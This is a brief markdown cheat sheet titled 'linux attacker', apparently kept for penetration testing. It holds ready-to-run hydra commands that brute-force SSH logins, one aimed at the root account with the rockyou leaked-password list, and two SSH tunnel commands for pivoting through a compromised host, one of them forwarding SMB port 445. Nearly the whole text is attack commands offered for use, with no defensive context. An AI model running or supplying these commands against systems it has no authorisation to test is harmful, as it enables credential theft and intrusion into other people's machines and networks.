# linux attacker

## bruteforce ssh root login

```bash
hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt "$rhost" -t 4 ssh
```

# bruteforce ssh with user wordlist and password wordlist

```bash
hydra -L pot-user.txt -P pot-password.txt "$rhost" -t 4 ssh
```

# tunnel local port 8001 to remote 8000

```
ssh -g -L 8001:localhost:8000 -N user@$rhost
```

# tunnel local port 445 to remote 445

```bash
ssh -N -L 0.0.0.0:445:"$rhost":445 user@$rhost
```
